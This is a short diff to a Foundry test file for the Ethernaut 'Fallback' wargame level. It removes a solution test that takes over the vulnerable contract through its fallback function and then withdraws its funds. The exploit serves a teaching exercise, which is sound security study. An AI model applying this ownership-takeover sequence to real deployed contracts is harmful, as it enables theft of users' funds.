@@ -49,18 +49,4 @@ contract TestFallback is Test, Utils {
         vm.startPrank(player);
         assertFalse(submitLevelInstance(ethernaut, address(instance)));
     }
-
-    /// @notice Test the solution for the level.
-    function testSolve() public {
-        vm.startPrank(player);
-
-        instance.contribute{value: 0.0001 ether}();
-
-        (bool sent,) = address(instance).call{value: 1}("");
-        require(sent, "Failed to send Ether to the instance");
-
-        instance.withdraw();
-
-        assertTrue(submitLevelInstance(ethernaut, address(instance)));
-    }
 }
